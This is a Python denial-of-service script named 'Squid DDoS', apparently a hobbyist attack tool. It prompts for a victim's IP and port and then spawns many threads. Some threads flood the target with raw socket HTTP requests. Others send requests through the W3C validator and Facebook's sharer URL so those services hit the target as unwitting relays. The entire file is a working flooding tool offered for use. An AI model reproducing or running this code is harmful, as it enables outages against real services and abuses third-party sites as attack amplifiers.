import urllib.request, random, socket, time, sys, threading, random, os
from queue import Queue
def user_agent(filename):
    global user_agents
    with open(filename, 'r') as agentfile:
        contents = agentfile.readlines()
    user_agents = []
    for i in contents:
        user_agents.append(i.strip())
    return user_agents
def get_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)
def hammerbots(url):
    while True:
        req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(user_agents)}))
        print("[+] Bot is Hammering.......")
        time.sleep(0.1)
def req_ddos():
    while True:
        try:
            item = q2.get()
            hammerbots(random.choice(bots) + "http://" + host)
            q2.task_done()
        except:
            pass
def sockddos():
    while True:
        try:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(user_agents) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet,(host, port)):
                s.shutdown(1)
                print("[+] Successfully sent a request to the server.")
            else:
                s.shutdown(1)
                print("[+] Unsuccessful request.")
            time.sleep(0.1)
        except:
            print("[+] Server May Be Down!")
def sock_ddos():
    while True:
        try:
            item = q.get()
            sockddos()
            q.task_done()
        except:
            pass
with open('headers.txt', 'w') as headers:
    lines = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n', 'Accept-Language: en-us,en;q=0.5\n', 'Accept-Encoding: gzip,deflate\n', 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n', 'Keep-Alive: 115\n', 'Connection: keep-alive']
    headers.writelines(lines)
    headers.close()
with open('headers.txt','r') as headers:
    data = headers.read()
    headers.close()
q = Queue()
q2 = Queue()
if __name__ == '__main__':
    while True:

            os.system('cls')
            print("   _____             _     _   _____  _____        _____        __   ___ ")
            print("  / ____|           (_)   | | |  __ \|  __ \      / ____|      /_ | / _ \ ")
            print(" | (___   __ _ _   _ _  __| | | |  | | |  | | ___| (___   __   _| || | | |")
            print("  \___ \ / _` | | | | |/ _` | | |  | | |  | |/ _  \___ \  \ \ / / || | | |")
            print("  ____) | (_| | |_| | | (_| | | |__| | |__| | (_) |___) |  \ V /| || |_| |")
            print(" |_____/ \__, |\__,_|_|\__,_| |_____/|_____/ \___/_____/    \_/ |_(_)___/ ")
            print("            | |                                                           ")
            print("            |_|                                                           ")
            print(" Script By DrSquid")
            file = input("[+] Enter file with useragents: ")
            tester = open(file, 'r')
            user_agent(file)
            host = input("[+] Enter the IP of the Victim: ")
            tester = socket.gethostbyname(host)
            port = int(input("[+] Enter the port to attack: "))
            thr = int(input("[+] How many threads will be created?: "))
            get_bots()
            while True:
                for i in range(thr):
                    ddos = threading.Thread(target=sock_ddos)
                    ddos.daemon = True
                    ddos.start()
                    ddos2 = threading.Thread(target=req_ddos)
                    ddos2.daemon = True
                    ddos2.start()
                start = time.time()
                item = 0
                while True:
                    if item > 1800:
                        item = 0
                        time.sleep(0.1)
                    item += 1
                    q.put(item)
                    q2.put(item)
                q.join()
                q2.join()

else:
    print("[+] How did you get here?")
